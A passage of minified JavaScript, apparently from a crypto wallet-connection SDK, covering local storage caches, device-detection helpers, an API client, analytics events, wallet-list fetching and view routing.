0},DEFAULT_ACCOUNT_TYPES:{bip122:"payment",eip155:"smartAccount",polkadot:"eoa",solana:"eoa"},ADAPTER_TYPES:{UNIVERSAL:"universal",SOLANA:"solana",WAGMI:"wagmi",ETHERS:"ethers",ETHERS5:"ethers5",BITCOIN:"bitcoin"}},pe={cacheExpiry:{portfolio:3e4,nativeBalance:3e4,ens:3e5,identity:3e5},isCacheExpired(t,e){return Date.now()-t>e},getActiveNetworkProps(){const t=pe.getActiveNamespace(),e=pe.getActiveCaipNetworkId(),r=e?e.split(":")[1]:void 0,n=r?isNaN(Number(r))?r:Number(r):void 0;return{namespace:t,caipNetworkId:e,chainId:n}},setWalletConnectDeepLink({name:t,href:e}){try{Pe.setItem(_e.DEEPLINK_CHOICE,JSON.stringify({href:e,name:t}))}catch{console.info("Unable to set WalletConnect deep link")}},getWalletConnectDeepLink(){try{const t=Pe.getItem(_e.DEEPLINK_CHOICE);if(t)return JSON.parse(t)}catch{console.info("Unable to get WalletConnect deep link")}},deleteWalletConnectDeepLink(){try{Pe.removeItem(_e.DEEPLINK_CHOICE)}catch{console.info("Unable to delete WalletConnect deep link")}},setActiveNamespace(t){try{Pe.setItem(_e.ACTIVE_NAMESPACE,t)}catch{console.info("Unable to set active namespace")}},setActiveCaipNetworkId(t){try{Pe.setItem(_e.ACTIVE_CAIP_NETWORK_ID,t),pe.setActiveNamespace(t.split(":")[0])}catch{console.info("Unable to set active caip network id")}},getActiveCaipNetworkId(){try{return Pe.getItem(_e.ACTIVE_CAIP_NETWORK_ID)}catch{console.info("Unable to get active caip network id");return}},deleteActiveCaipNetworkId(){try{Pe.removeItem(_e.ACTIVE_CAIP_NETWORK_ID)}catch{console.info("Unable to delete active caip network id")}},deleteConnectedConnectorId(t){try{const e=Cw(t);Pe.removeItem(e)}catch{console.info("Unable to delete connected connector id")}},setAppKitRecent(t){try{const e=pe.getRecentWallets();e.find(r=>r.id===t.id)||(e.unshift(t),e.length>2&&e.pop(),Pe.setItem(_e.RECENT_WALLETS,JSON.stringify(e)))}catch{console.info("Unable to set AppKit recent")}},getRecentWallets(){try{const t=Pe.getItem(_e.RECENT_WALLETS);return t?JSON.parse(t):[]}catch{console.info("Unable to get AppKit recent")}return[]},setConnectedConnectorId(t,e){try{const r=Cw(t);Pe.setItem(r,e)}catch{console.info("Unable to set Connected Connector Id")}},getActiveNamespace(){try{return Pe.getItem(_e.ACTIVE_NAMESPACE)}catch{console.info("Unable to get active namespace")}},getConnectedConnectorId(t){if(t)try{const e=Cw(t);return Pe.getItem(e)}catch{console.info("Unable to get connected connector id in namespace ",t)}},setConnectedSocialProvider(t){try{Pe.setItem(_e.CONNECTED_SOCIAL,t)}catch{console.info("Unable to set connected social provider")}},getConnectedSocialProvider(){try{return Pe.getItem(_e.CONNECTED_SOCIAL)}catch{console.info("Unable to get connected social provider")}},deleteConnectedSocialProvider(){try{Pe.removeItem(_e.CONNECTED_SOCIAL)}catch{console.info("Unable to delete connected social provider")}},getConnectedSocialUsername(){try{return Pe.getItem(_e.CONNECTED_SOCIAL_USERNAME)}catch{console.info("Unable to get connected social username")}},getStoredActiveCaipNetworkId(){var t,e;return(e=(t=Pe.getItem(_e.ACTIVE_CAIP_NETWORK_ID))==null?void 0:t.split(":"))==null?void 0:e[1]},setConnectionStatus(t){try{Pe.setItem(_e.CONNECTION_STATUS,t)}catch{console.info("Unable to set connection status")}},getConnectionStatus(){try{return Pe.getItem(_e.CONNECTION_STATUS)}catch{return}},getConnectedNamespaces(){try{const t=Pe.getItem(_e.CONNECTED_NAMESPACES);return t!=null&&t.length?t.split(","):[]}catch{return[]}},setConnectedNamespaces(t){try{const e=Array.from(new Set(t));Pe.setItem(_e.CONNECTED_NAMESPACES,e.join(","))}catch{console.info("Unable to set namespaces in storage")}},addConnectedNamespace(t){try{const e=pe.getConnectedNamespaces();e.includes(t)||(e.push(t),pe.setConnectedNamespaces(e))}catch{console.info("Unable to add connected namespace")}},removeConnectedNamespace(t){try{const e=pe.getConnectedNamespaces(),r=e.indexOf(t);r>-1&&(e.splice(r,1),pe.setConnectedNamespaces(e))}catch{console.info("Unable to remove connected namespace")}},getTelegramSocialProvider(){try{return Pe.getItem(_e.TELEGRAM_SOCIAL_PROVIDER)}catch{return console.info("Unable to get telegram social provider"),null}},setTelegramSocialProvider(t){try{Pe.setItem(_e.TELEGRAM_SOCIAL_PROVIDER,t)}catch{console.info("Unable to set telegram social provider")}},removeTelegramSocialProvider(){try{Pe.removeItem(_e.TELEGRAM_SOCIAL_PROVIDER)}catch{console.info("Unable to remove telegram social provider")}},getBalanceCache(){let t={};try{const e=Pe.getItem(_e.PORTFOLIO_CACHE);t=e?JSON.parse(e):{}}catch{console.info("Unable to get balance cache")}return t},removeAddressFromBalanceCache(t){try{const e=pe.getBalanceCache();Pe.setItem(_e.PORTFOLIO_CACHE,JSON.stringify({...e,[t]:void 0}))}catch{console.info("Unable to remove address from balance cache",t)}},getBalanceCacheForCaipAddress(t){try{const e=pe.getBalanceCache()[t];if(e&&!this.isCacheExpired(e.timestamp,this.cacheExpiry.portfolio))return e.balance;pe.removeAddressFromBalanceCache(t)}catch{console.info("Unable to get balance cache for address",t)}},updateBalanceCache(t){try{const e=pe.getBalanceCache();e[t.caipAddress]=t,Pe.setItem(_e.PORTFOLIO_CACHE,JSON.stringify(e))}catch{console.info("Unable to update balance cache",t)}},getNativeBalanceCache(){let t={};try{const e=Pe.getItem(_e.NATIVE_BALANCE_CACHE);t=e?JSON.parse(e):{}}catch{console.info("Unable to get balance cache")}return t},removeAddressFromNativeBalanceCache(t){try{const e=pe.getBalanceCache();Pe.setItem(_e.NATIVE_BALANCE_CACHE,JSON.stringify({...e,[t]:void 0}))}catch{console.info("Unable to remove address from balance cache",t)}},getNativeBalanceCacheForCaipAddress(t){try{const e=pe.getNativeBalanceCache()[t];if(e&&!this.isCacheExpired(e.timestamp,this.cacheExpiry.nativeBalance))return e;console.info("Discarding cache for address",t),pe.removeAddressFromBalanceCache(t)}catch{console.info("Unable to get balance cache for address",t)}},updateNativeBalanceCache(t){try{const e=pe.getNativeBalanceCache();e[t.caipAddress]=t,Pe.setItem(_e.NATIVE_BALANCE_CACHE,JSON.stringify(e))}catch{console.info("Unable to update balance cache",t)}},getEnsCache(){let t={};try{const e=Pe.getItem(_e.ENS_CACHE);t=e?JSON.parse(e):{}}catch{console.info("Unable to get ens name cache")}return t},getEnsFromCacheForAddress(t){try{const e=pe.getEnsCache()[t];if(e&&!this.isCacheExpired(e.timestamp,this.cacheExpiry.ens))return e.ens;pe.removeEnsFromCache(t)}catch{console.info("Unable to get ens name from cache",t)}},updateEnsCache(t){try{const e=pe.getEnsCache();e[t.address]=t,Pe.setItem(_e.ENS_CACHE,JSON.stringify(e))}catch{console.info("Unable to update ens name cache",t)}},removeEnsFromCache(t){try{const e=pe.getEnsCache();Pe.setItem(_e.ENS_CACHE,JSON.stringify({...e,[t]:void 0}))}catch{console.info("Unable to remove ens name from cache",t)}},getIdentityCache(){let t={};try{const e=Pe.getItem(_e.IDENTITY_CACHE);t=e?JSON.parse(e):{}}catch{console.info("Unable to get identity cache")}return t},getIdentityFromCacheForAddress(t){try{const e=pe.getIdentityCache()[t];if(e&&!this.isCacheExpired(e.timestamp,this.cacheExpiry.identity))return e.identity;pe.removeIdentityFromCache(t)}catch{console.info("Unable to get identity from cache",t)}},updateIdentityCache(t){try{const e=pe.getIdentityCache();e[t.address]={identity:t.identity,timestamp:t.timestamp},Pe.setItem(_e.IDENTITY_CACHE,JSON.stringify(e))}catch{console.info("Unable to update identity cache",t)}},removeIdentityFromCache(t){try{const e=pe.getIdentityCache();Pe.setItem(_e.IDENTITY_CACHE,JSON.stringify({...e,[t]:void 0}))}catch{console.info("Unable to remove identity from cache",t)}},clearAddressCache(){try{Pe.removeItem(_e.PORTFOLIO_CACHE),Pe.removeItem(_e.NATIVE_BALANCE_CACHE),Pe.removeItem(_e.ENS_CACHE),Pe.removeItem(_e.IDENTITY_CACHE)}catch{console.info("Unable to clear address cache")}},setPreferredAccountTypes(t){try{Pe.setItem(_e.PREFERRED_ACCOUNT_TYPES,JSON.stringify(t))}catch{console.info("Unable to set preferred account types",t)}},getPreferredAccountTypes(){try{const t=Pe.getItem(_e.PREFERRED_ACCOUNT_TYPES);return JSON.parse(t)}catch{console.info("Unable to get preferred account types")}}},te={isMobile(){var t;return this.isClient()?!!((t=window==null?void 0:window.matchMedia("(pointer:coarse)"))!=null&&t.matches||/Android|webOS|iPhone|iPad|iPod|BlackBerry|Opera Mini/u.test(navigator.userAgent)):!1},checkCaipNetwork(t,e=""){return t==null?void 0:t.caipNetworkId.toLocaleLowerCase().includes(e.toLowerCase())},isAndroid(){if(!this.isMobile())return!1;const t=window==null?void 0:window.navigator.userAgent.toLowerCase();return te.isMobile()&&t.includes("android")},isIos(){if(!this.isMobile())return!1;const t=window==null?void 0:window.navigator.userAgent.toLowerCase();return t.includes("iphone")||t.includes("ipad")},isSafari(){return this.isClient()?(window==null?void 0:window.navigator.userAgent.toLowerCase()).includes("safari"):!1},isClient(){return typeof window<"u"},isPairingExpired(t){return t?t-Date.now()<=Ut.TEN_SEC_MS:!0},isAllowedRetry(t,e=Ut.ONE_SEC_MS){return Date.now()-t>=e},copyToClopboard(t){navigator.clipboard.writeText(t)},isIframe(){try{return(window==null?void 0:window.self)!==(window==null?void 0:window.top)}catch{return!1}},getPairingExpiry(){return Date.now()+Ut.FOUR_MINUTES_MS},getNetworkId(t){return t==null?void 0:t.split(":")[1]},getPlainAddress(t){return t==null?void 0:t.split(":")[2]},async wait(t){return new Promise(e=>{setTimeout(e,t)})},debounce(t,e=500){let r;return(...n)=>{function i(){t(...n)}r&&clearTimeout(r),r=setTimeout(i,e)}},isHttpUrl(t){return t.startsWith("http://")||t.startsWith("https://")},formatNativeUrl(t,e){if(te.isHttpUrl(t))return this.formatUniversalUrl(t,e);let r=t;r.includes("://")||(r=t.replaceAll("/","").replaceAll(":",""),r=`${r}://`),r.endsWith("/")||(r=`${r}/`),this.isTelegram()&&this.isAndroid()&&(e=encodeURIComponent(e));const n=encodeURIComponent(e);return{redirect:`${r}wc?uri=${n}`,href:r}},formatUniversalUrl(t,e){if(!te.isHttpUrl(t))return this.formatNativeUrl(t,e);let r=t;r.endsWith("/")||(r=`${r}/`);const n=encodeURIComponent(e);return{redirect:`${r}wc?uri=${n}`,href:r}},getOpenTargetForPlatform(t){return t==="popupWindow"?t:this.isTelegram()?pe.getTelegramSocialProvider()?"_top":"_blank":t},openHref(t,e,r){window==null||window.open(t,this.getOpenTargetForPlatform(e),r||"noreferrer noopener")},returnOpenHref(t,e,r){return window==null?void 0:window.open(t,this.getOpenTargetForPlatform(e),r||"noreferrer noopener")},isTelegram(){return typeof window<"u"&&(!!window.TelegramWebviewProxy||!!window.Telegram||!!window.TelegramWebviewProxyProto)},async preloadImage(t){const e=new Promise((r,n)=>{const i=new Image;i.onload=r,i.onerror=n,i.crossOrigin="anonymous",i.src=t});return Promise.race([e,te.wait(2e3)])},formatBalance(t,e){let r="0.000";if(typeof t=="string"){const n=Number(t);if(n){const i=Math.floor(n*1e3)/1e3;i&&(r=i.toString())}}return`${r}${e?` ${e}`:""}`},formatBalance2(t,e){var n;let r;if(t==="0")r="0";else if(typeof t=="string"){const i=Number(t);i&&(r=(n=i.toString().match(/^-?\d+(?:\.\d{0,3})?/u))==null?void 0:n[0])}return{value:r??"0",rest:r==="0"?"000":"",symbol:e}},getApiUrl(){return ve.W3M_API_URL},getBlockchainApiUrl(){return ve.BLOCKCHAIN_API_RPC_URL},getAnalyticsUrl(){return ve.PULSE_API_URL},getUUID(){return crypto!=null&&crypto.randomUUID?crypto.randomUUID():"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu,t=>{const e=Math.random()*16|0;return(t==="x"?e:e&3|8).toString(16)})},parseError(t){var e,r;return typeof t=="string"?t:typeof((r=(e=t==null?void 0:t.issues)==null?void 0:e[0])==null?void 0:r.message)=="string"?t.issues[0].message:t instanceof Error?t.message:"Unknown error"},sortRequestedNetworks(t,e=[]){const r={};return e&&t&&(t.forEach((n,i)=>{r[n]=i}),e.sort((n,i)=>{const s=r[n.id],o=r[i.id];return s!==void 0&&o!==void 0?s-o:s!==void 0?-1:o!==void 0?1:0})),e},calculateBalance(t){let e=0;for(const r of t)e+=r.value??0;return e},formatTokenBalance(t){const e=t.toFixed(2),[r,n]=e.split(".");return{dollars:r,pennies:n}},isAddress(t,e="eip155"){switch(e){case"eip155":if(/^(?:0x)?[0-9a-f]{40}$/iu.test(t)){if(/^(?:0x)?[0-9a-f]{40}$/iu.test(t)||/^(?:0x)?[0-9A-F]{40}$/iu.test(t))return!0}else return!1;return!1;case"solana":return/[1-9A-HJ-NP-Za-km-z]{32,44}$/iu.test(t);default:return!1}},uniqueBy(t,e){const r=new Set;return t.filter(n=>{const i=n[e];return r.has(i)?!1:(r.add(i),!0)})},generateSdkVersion(t,e,r){const n=t.length===0?Ut.ADAPTER_TYPES.UNIVERSAL:t.map(i=>i.adapterType).join(",");return`${e}-${n}-${r}`},createAccount(t,e,r,n,i){return{namespace:t,address:e,type:r,publicKey:n,path:i}},isCaipAddress(t){if(typeof t!="string")return!1;const e=t.split(":"),r=e[0];return e.filter(Boolean).length===3&&r in ve.CHAIN_NAME_MAP},isMac(){const t=window==null?void 0:window.navigator.userAgent.toLowerCase();return t.includes("macintosh")&&!t.includes("safari")},formatTelegramSocialLoginUrl(t){const e=`--${encodeURIComponent(window==null?void 0:window.location.href)}`,r="state=";if(new URL(t).host==="auth.magic.link"){const n="provider_authorization_url=",i=t.substring(t.indexOf(n)+n.length),s=this.injectIntoUrl(decodeURIComponent(i),r,e);return t.replace(i,encodeURIComponent(s))}return this.injectIntoUrl(t,r,e)},injectIntoUrl(t,e,r){const n=t.indexOf(e);if(n===-1)throw new Error(`${e} parameter not found in the URL: ${t}`);const i=t.indexOf("&",n),s=e.length,o=i!==-1?i:t.length,a=t.substring(0,n+s),c=t.substring(n+s,o),l=t.substring(i),u=c+r;return a+u+l}};async function Th(...t){const e=await fetch(...t);if(!e.ok)throw new Error(`HTTP status code: ${e.status}`,{cause:e});return e}class n1{constructor({baseUrl:e,clientId:r}){this.baseUrl=e,this.clientId=r}async get({headers:e,signal:r,cache:n,...i}){const s=this.createUrl(i);return(await Th(s,{method:"GET",headers:e,signal:r,cache:n})).json()}async getBlob({headers:e,signal:r,...n}){const i=this.createUrl(n);return(await Th(i,{method:"GET",headers:e,signal:r})).blob()}async post({body:e,headers:r,signal:n,...i}){const s=this.createUrl(i);return(await Th(s,{method:"POST",headers:r,body:e?JSON.stringify(e):void 0,signal:n})).json()}async put({body:e,headers:r,signal:n,...i}){const s=this.createUrl(i);return(await Th(s,{method:"PUT",headers:r,body:e?JSON.stringify(e):void 0,signal:n})).json()}async delete({body:e,headers:r,signal:n,...i}){const s=this.createUrl(i);return(await Th(s,{method:"DELETE",headers:r,body:e?JSON.stringify(e):void 0,signal:n})).json()}createUrl({path:e,params:r}){const n=new URL(e,this.baseUrl);return r&&Object.entries(r).forEach(([i,s])=>{s&&n.searchParams.append(i,s)}),this.clientId&&n.searchParams.append("clientId",this.clientId),n}}const vj={handleSolanaDeeplinkRedirect(t){if(B.state.activeChain===ve.CHAIN.SOLANA){const e=window.location.href,r=encodeURIComponent(e);if(t==="Phantom"&&!("phantom"in window)){const n=e.startsWith("https")?"https":"http",i=e.split("/")[2],s=encodeURIComponent(`${n}://${i}`);window.location.href=`https://phantom.app/ul/browse/${r}?ref=${s}`}t==="Coinbase Wallet"&&!("coinbaseSolana"in window)&&(window.location.href=`https://go.cb-w.com/dapp?cb_url=${r}`)}}},en=ht({walletImages:{},networkImages:{},chainImages:{},connectorImages:{},tokenImages:{},currencyImages:{}}),Wr={state:en,subscribeNetworkImages(t){return yr(en.networkImages,()=>t(en.networkImages))},subscribeKey(t,e){return Tr(en,t,e)},subscribe(t){return yr(en,()=>t(en))},setWalletImage(t,e){en.walletImages[t]=e},setNetworkImage(t,e){en.networkImages[t]=e},setChainImage(t,e){en.chainImages[t]=e},setConnectorImage(t,e){en.connectorImages={...en.connectorImages,[t]:e}},setTokenImage(t,e){en.tokenImages[t]=e},setCurrencyImage(t,e){en.currencyImages[t]=e}},Ej={eip155:"ba0ba0cd-17c6-4806-ad93-f9d174f17900",solana:"a1b58899-f671-4276-6a5e-56ca5bd59700",polkadot:"",bip122:"0b4838db-0161-4ffe-022d-532bf03dba00"},Iw=ht({networkImagePromises:{}}),Mt={async fetchWalletImage(t){if(t)return await oe._fetchWalletImage(t),this.getWalletImageById(t)},async fetchNetworkImage(t){return t?this.getNetworkImageById(t)||(Iw.networkImagePromises[t]||(Iw.networkImagePromises[t]=oe._fetchNetworkImage(t)),await Iw.networkImagePromises[t],this.getNetworkImageById(t)):void 0},getWalletImageById(t){if(t)return Wr.state.walletImages[t]},getWalletImage(t){if(t!=null&&t.image_url)return t==null?void 0:t.image_url;if(t!=null&&t.image_id)return Wr.state.walletImages[t.image_id]},getNetworkImage(t){var e,r,n;if((e=t==null?void 0:t.assets)!=null&&e.imageUrl)return(r=t==null?void 0:t.assets)==null?void 0:r.imageUrl;if((n=t==null?void 0:t.assets)!=null&&n.imageId)return Wr.state.networkImages[t.assets.imageId]},getNetworkImageById(t){if(t)return Wr.state.networkImages[t]},getConnectorImage(t){if(t!=null&&t.imageUrl)return t.imageUrl;if(t!=null&&t.imageId)return Wr.state.connectorImages[t.imageId]},getChainImage(t){return Wr.state.networkImages[Ej[t]]}},Cj={getFeatureValue(t,e){const r=e==null?void 0:e[t];return r===void 0?Ut.DEFAULT_FEATURES[t]:r},filterSocialsByPlatform(t){if(!t||!t.length)return t;if(te.isTelegram()){if(te.isIos())return t.filter(e=>e!=="google");if(te.isMac())return t.filter(e=>e!=="x");if(te.isAndroid())return t.filter(e=>!["facebook","x"].includes(e))}return t}},xe=ht({features:Ut.DEFAULT_FEATURES,projectId:"",sdkType:"appkit",sdkVersion:"html-wagmi-undefined",defaultAccountTypes:{solana:"eoa",bip122:"payment",polkadot:"eoa",eip155:"smartAccount"},enableNetworkSwitch:!0}),Y={state:xe,subscribeKey(t,e){return Tr(xe,t,e)},setOptions(t){Object.assign(xe,t)},setFeatures(t){if(!t)return;xe.features||(xe.features=Ut.DEFAULT_FEATURES);const e={...xe.features,...t};xe.features=e,xe.features.socials&&(xe.features.socials=Cj.filterSocialsByPlatform(xe.features.socials))},setProjectId(t){xe.projectId=t},setCustomRpcUrls(t){xe.customRpcUrls=t},setAllWallets(t){xe.allWallets=t},setIncludeWalletIds(t){xe.includeWalletIds=t},setExcludeWalletIds(t){xe.excludeWalletIds=t},setFeaturedWalletIds(t){xe.featuredWalletIds=t},setTokens(t){xe.tokens=t},setTermsConditionsUrl(t){xe.termsConditionsUrl=t},setPrivacyPolicyUrl(t){xe.privacyPolicyUrl=t},setCustomWallets(t){xe.customWallets=t},setIsSiweEnabled(t){xe.isSiweEnabled=t},setIsUniversalProvider(t){xe.isUniversalProvider=t},setSdkVersion(t){xe.sdkVersion=t},setMetadata(t){xe.metadata=t},setDisableAppend(t){xe.disableAppend=t},setEIP6963Enabled(t){xe.enableEIP6963=t},setDebug(t){xe.debug=t},setEnableWalletConnect(t){xe.enableWalletConnect=t},setEnableWalletGuide(t){xe.enableWalletGuide=t},setEnableAuthLogger(t){xe.enableAuthLogger=t},setEnableWallets(t){xe.enableWallets=t},setHasMultipleAddresses(t){xe.hasMultipleAddresses=t},setSIWX(t){xe.siwx=t},setConnectMethodsOrder(t){xe.features={...xe.features,connectMethodsOrder:t}},setWalletFeaturesOrder(t){xe.features={...xe.features,walletFeaturesOrder:t}},setSocialsOrder(t){xe.features={...xe.features,socials:t}},setCollapseWallets(t){xe.features={...xe.features,collapseWallets:t}},setEnableEmbedded(t){xe.enableEmbedded=t},setAllowUnsupportedChain(t){xe.allowUnsupportedChain=t},setManualWCControl(t){xe.manualWCControl=t},setEnableNetworkSwitch(t){xe.enableNetworkSwitch=t},setDefaultAccountTypes(t={}){Object.entries(t).forEach(([e,r])=>{r&&(xe.defaultAccountTypes[e]=r)})},setUniversalProviderConfigOverride(t){xe.universalProviderConfigOverride=t},getUniversalProviderConfigOverride(){return xe.universalProviderConfigOverride},getSnapshot(){return Fd(xe)}},Qs=ht({message:"",variant:"info",open:!1}),Lo={state:Qs,subscribeKey(t,e){return Tr(Qs,t,e)},open(t,e){const{debug:r}=Y.state,{shortMessage:n,longMessage:i}=t;r&&(Qs.message=n,Qs.variant=e,Qs.open=!0),i&&console.error(typeof i=="function"?i():i)},close(){Qs.open=!1,Qs.message="",Qs.variant="info"}},Aj=te.getAnalyticsUrl(),xj=new n1({baseUrl:Aj,clientId:null}),Ij=["MODAL_CREATED"],ts=ht({timestamp:Date.now(),reportedErrors:{},data:{type:"track",event:"MODAL_CREATED"}}),De={state:ts,subscribe(t){return yr(ts,()=>t(ts))},getSdkProperties(){const{projectId:t,sdkType:e,sdkVersion:r}=Y.state;return{projectId:t,st:e,sv:r||"html-wagmi-4.2.2"}},async _sendAnalyticsEvent(t){try{const e=me.state.address;if(Ij.includes(t.data.event)||typeof window>"u")return;await xj.post({path:"/e",params:De.getSdkProperties(),body:{eventId:te.getUUID(),url:window.location.href,domain:window.location.hostname,timestamp:t.timestamp,props:{...t.data,address:e}}}),ts.reportedErrors.FORBIDDEN=!1}catch(e){e instanceof Error&&e.cause instanceof Response&&e.cause.status===ve.HTTP_STATUS_CODES.FORBIDDEN&&!ts.reportedErrors.FORBIDDEN&&(Lo.open({shortMessage:"Invalid App Configuration",longMessage:`Origin ${ld()?window.origin:"uknown"} not found on Allowlist - update configuration on cloud.reown.com`},"error"),ts.reportedErrors.FORBIDDEN=!0)}},sendEvent(t){var e;ts.timestamp=Date.now(),ts.data=t,(e=Y.state.features)!=null&&e.analytics&&De._sendAnalyticsEvent(ts)}},Sj=["1ca0bdd4747578705b1939af023d120677c64fe6ca76add81fda36e350605e79","fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa","a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393"],Nj=te.getApiUrl(),Cn=new n1({baseUrl:Nj,clientId:null}),Pj=40,a4=4,kj=20,tt=ht({promises:{},page:1,count:0,featured:[],allFeatured:[],recommended:[],allRecommended:[],wallets:[],search:[],isAnalyticsEnabled:!1,excludedWallets:[],isFetchingRecommendedWallets:!1}),oe={state:tt,subscribeKey(t,e){return Tr(tt,t,e)},_getSdkProperties(){const{projectId:t,sdkType:e,sdkVersion:r}=Y.state;return{projectId:t,st:e||"appkit",sv:r||"html-wagmi-4.2.2"}},_filterOutExtensions(t){return Y.state.isUniversalProvider?t.filter(e=>!!(e.mobile_link||e.desktop_link||e.webapp_link)):t},async _fetchWalletImage(t){const e=`${Cn.baseUrl}/getWalletImage/${t}`,r=await Cn.getBlob({path:e,params:oe._getSdkProperties()});Wr.setWalletImage(t,URL.createObjectURL(r))},async _fetchNetworkImage(t){const e=`${Cn.baseUrl}/public/getAssetImage/${t}`,r=await Cn.getBlob({path:e,params:oe._getSdkProperties()});Wr.setNetworkImage(t,URL.createObjectURL(r))},async _fetchConnectorImage(t){const e=`${Cn.baseUrl}/public/getAssetImage/${t}`,r=await Cn.getBlob({path:e,params:oe._getSdkProperties()});Wr.setConnectorImage(t,URL.createObjectURL(r))},async _fetchCurrencyImage(t){const e=`${Cn.baseUrl}/public/getCurrencyImage/${t}`,r=await Cn.getBlob({path:e,params:oe._getSdkProperties()});Wr.setCurrencyImage(t,URL.createObjectURL(r))},async _fetchTokenImage(t){const e=`${Cn.baseUrl}/public/getTokenImage/${t}`,r=await Cn.getBlob({path:e,params:oe._getSdkProperties()});Wr.setTokenImage(t,URL.createObjectURL(r))},async fetchNetworkImages(){var e;const t=(e=B.getAllRequestedCaipNetworks())==null?void 0:e.map(({assets:r})=>r==null?void 0:r.imageId).filter(Boolean).filter(r=>!Mt.getNetworkImageById(r));t&&await Promise.allSettled(t.map(r=>oe._fetchNetworkImage(r)))},async fetchConnectorImages(){const{connectors:t}=ae.state,e=t.map(({imageId:r})=>r).filter(Boolean);await Promise.allSettled(e.map(r=>oe._fetchConnectorImage(r)))},async fetchCurrencyImages(t=[]){await Promise.allSettled(t.map(e=>oe._fetchCurrencyImage(e)))},async fetchTokenImages(t=[]){await Promise.allSettled(t.map(e=>oe._fetchTokenImage(e)))},async fetchWallets(t){var r,n;const e=t.exclude??[];return oe._getSdkProperties().sv.startsWith("html-core-")&&e.push(...Sj),await Cn.get({path:"/getWallets",params:{...oe._getSdkProperties(),...t,page:String(t.page),entries:String(t.entries),include:(r=t.include)==null?void 0:r.join(","),exclude:(n=t.exclude)==null?void 0:n.join(",")}})},async fetchFeaturedWallets(){const{featuredWalletIds:t}=Y.state;if(t!=null&&t.length){const e={...oe._getSdkProperties(),page:1,entries:(t==null?void 0:t.length)??a4,include:t},{data:r}=await oe.fetchWallets(e);r.sort((i,s)=>t.indexOf(i.id)-t.indexOf(s.id));const n=r.map(i=>i.image_id).filter(Boolean);await Promise.allSettled(n.map(i=>oe._fetchWalletImage(i))),tt.featured=r,tt.allFeatured=r}},async fetchRecommendedWallets(){try{tt.isFetchingRecommendedWallets=!0;const{includeWalletIds:t,excludeWalletIds:e,featuredWalletIds:r}=Y.state,n=[...e??[],...r??[]].filter(Boolean),i=B.getRequestedCaipNetworkIds().join(","),s={page:1,entries:a4,include:t,exclude:n,chains:i},{data:o,count:a}=await oe.fetchWallets(s),c=pe.getRecentWallets(),l=o.map(h=>h.image_id).filter(Boolean),u=c.map(h=>h.image_id).filter(Boolean);await Promise.allSettled([...l,...u].map(h=>oe._fetchWalletImage(h))),tt.recommended=o,tt.allRecommended=o,tt.count=a??0}catch{}finally{tt.isFetchingRecommendedWallets=!1}},async fetchWalletsByPage({page:t}){const{includeWalletIds:e,excludeWalletIds:r,featuredWalletIds:n}=Y.state,i=B.getRequestedCaipNetworkIds().join(","),s=[...tt.recommended.map(({id:u})=>u),...r??[],...n??[]].filter(Boolean),o={page:t,entries:Pj,include:e,exclude:s,chains:i},{data:a,count:c}=await oe.fetchWallets(o),l=a.slice(0,kj).map(u=>u.image_id).filter(Boolean);await Promise.allSettled(l.map(u=>oe._fetchWalletImage(u))),tt.wallets=te.uniqueBy([...tt.wallets,...oe._filterOutExtensions(a)],"id"),tt.count=c>tt.count?c:tt.count,tt.page=t},async initializeExcludedWallets({ids:t}){const e=B.getRequestedCaipNetworkIds().join(","),r={page:1,entries:t.length,include:t,chains:e},{data:n}=await oe.fetchWallets(r);n&&n.forEach(i=>{tt.excludedWallets.push({rdns:i.rdns,name:i.name})})},async searchWallet({search:t,badge:e}){const{includeWalletIds:r,excludeWalletIds:n}=Y.state,i=B.getRequestedCaipNetworkIds().join(",");tt.search=[];const s={page:1,entries:100,search:t==null?void 0:t.trim(),badge_type:e,include:r,exclude:n,chains:i},{data:o}=await oe.fetchWallets(s);De.sendEvent({type:"track",event:"SEARCH_WALLET",properties:{badge:e??"",search:t??""}});const a=o.map(c=>c.image_id).filter(Boolean);await Promise.allSettled([...a.map(c=>oe._fetchWalletImage(c)),te.wait(300)]),tt.search=oe._filterOutExtensions(o)},initPromise(t,e){return tt.promises[t]||(tt.promises[t]=e())},prefetch({fetchConnectorImages:t=!0,fetchFeaturedWallets:e=!0,fetchRecommendedWallets:r=!0,fetchNetworkImages:n=!0}={}){const i=[t&&oe.initPromise("connectorImages",oe.fetchConnectorImages),e&&oe.initPromise("featuredWallets",oe.fetchFeaturedWallets),r&&oe.initPromise("recommendedWallets",oe.fetchRecommendedWallets),n&&oe.initPromise("networkImages",oe.fetchNetworkImages)].filter(Boolean);return Promise.allSettled(i)},prefetchAnalyticsConfig(){var t;(t=Y.state.features)!=null&&t.analytics&&oe.fetchAnalyticsConfig()},async fetchAnalyticsConfig(){try{const{isAnalyticsEnabled:t}=await Cn.get({path:"/getAnalyticsConfig",params:oe._getSdkProperties()});Y.setFeatures({analytics:t})}catch{Y.setFeatures({analytics:!1})}},setFilterByNamespace(t){if(!t){tt.featured=tt.allFeatured,tt.recommended=tt.allRecommended;return}const e=B.getRequestedCaipNetworkIds().join(",");tt.featured=tt.allFeatured.filter(r=>{var n;return(n=r.chains)==null?void 0:n.some(i=>e.includes(i))}),tt.recommended=tt.allRecommended.filter(r=>{var n;return(n=r.chains)==null?void 0:n.some(i=>e.includes(i))})}},Ye=ht({view:"Connect",history:["Connect"],transactionStack:[]}),se={state:Ye,subscribeKey(t,e){return Tr(Ye,t,e)},pushTransactionStack(t){Ye.transactionStack.push(t)},popTransactionStack(t){var r,n;const e=Ye.transactionStack.pop();if(e)if(t)this.goBack(),(r=e==null?void 0:e.onCancel)==null||r.call(e);else{if(e.goBack)this.goBack();else if(e.replace){const i=Ye.history.indexOf("ConnectingSiwe");i>0?this.goBackToIndex(i-1):(qe.close(),Ye.history=[])}else e.view&&this.reset(e.view);(n=e==null?void 0:e.onSuccess)==null||n.call(e)}},push(t,e){t!==Ye.view&&(Ye.view=t,Ye.history.push(t),Ye.data=e)},reset(t,e){Ye.view=t,Ye.history=[t],Ye.data=e},replace(t,e){Ye.history.at(-1)===t||(Ye.view=t,Ye.history[Ye.history.length-1]=t,Ye.data=e)},goBack(){var e;const t=!B.state.activeCaipAddress&&this.state.view==="ConnectingFarcaster";if(Ye.history.length>1&&!Ye.history.includes("UnsupportedChain")){Ye.history.pop();const[r]=Ye.history.slice(-1);r&&(Ye.view=r)}else qe.close();(e=Ye.data)!=null&&e.wallet&&(Ye.data.wallet=void 0),setTimeout(()=>{var 